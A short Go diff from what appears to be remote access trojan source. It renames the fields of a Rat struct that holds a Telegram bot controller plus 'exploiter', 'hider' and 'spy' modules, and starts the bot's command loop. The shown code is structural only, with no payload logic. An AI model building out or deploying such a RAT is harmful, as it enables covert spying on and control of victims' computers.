@@ -14,13 +14,13 @@ import (
 )
 
 type Rat struct {
-	bot       *bot.Tgbot
-	engine    *engine.Engine
-	exploiter *exploiter.Exploiter
-	hider     *hider.Hider
-	spy       *spy.Spy
+	Bot       *bot.Tgbot
+	Engine    *engine.Engine
+	Exploiter *exploiter.Exploiter
+	Hider     *hider.Hider
+	Spy       *spy.Spy
 
-	config  config.Config
+	Config  config.Config
 	CloseCh chan (error)
 }
 
@@ -60,12 +60,12 @@ func NewRat() (*Rat, error) {
 	}
 
 	rat := Rat{
-		bot:       bot,
-		engine:    eng,
-		exploiter: exp,
-		hider:     hdr,
-		spy:       spy,
-		config:    cfg,
+		Bot:       bot,
+		Engine:    eng,
+		Exploiter: exp,
+		Hider:     hdr,
+		Spy:       spy,
+		Config:    cfg,
 		CloseCh:   make(chan error, 1),
 	}
 
@@ -73,9 +73,9 @@ func NewRat() (*Rat, error) {
 }
 
 func (r *Rat) internalClose(reason error) {
-	r.bot.Close()
-	r.engine.Close()
-	r.spy.Close()
+	r.Bot.Close()
+	r.Engine.Close()
+	r.Spy.Close()
 
 	r.CloseCh <- reason
 }
@@ -86,6 +86,6 @@ func (r *Rat) Close() {
 
 func (r *Rat) Start() {
 	dlog.GLogger.Info("Запуск ратника")
-	go r.bot.CommandsHandligLoop(r.engine)
-	go r.bot.WakeNotification()
+	go r.Bot.CommandsHandligLoop(r.Engine)
+	go r.Bot.WakeNotification()
 }
